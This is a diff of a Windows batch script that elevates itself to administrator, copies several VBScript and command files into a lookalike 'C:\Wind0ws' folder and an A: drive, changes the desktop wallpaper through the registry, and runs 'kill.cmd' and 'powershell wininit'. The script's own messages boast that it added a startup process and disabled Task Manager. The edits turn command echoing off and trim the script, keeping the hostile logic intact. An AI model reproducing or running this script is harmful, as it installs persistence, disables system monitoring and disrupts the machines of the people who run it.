@@ -1,4 +1,4 @@
-@echo on
+@echo off
 
 :: BatchGotAdmin
 :-------------------------------------
@@ -27,9 +27,7 @@ if '%errorlevel%' NEQ '0' (
 :gotAdmin
     pushd "%CD%"
     CD /D "%~dp0"
-
 echo Starting file spread
-
 copy msg.vbs C:\Wind0ws
 copy runatstart.cmd C:\Wind0ws
 copy msg.vbs C:\Wind0ws
@@ -38,14 +36,11 @@ copy e.cmd C:\Wind0ws
 start echo Setup complete
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  C:\Wind\back.jpg /t
 copy kill.cmd C:\Wind0ws
-
-
 copy msg.vbs A:\Wind0ws
 copy runatstart.cmd A:\Wind0ws
 copy msg.vbs A:\Wind0ws
 copy stw.vbs A:\Wind0ws
 copy e.cmd A:\Wind0ws
-
 echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
 echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
 echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
@@ -54,7 +49,5 @@ echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr 
 echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
 
 
-powershell wininit
-powershell wininit
 powershell wininit
 C:\Wind0ws\kill.cmd
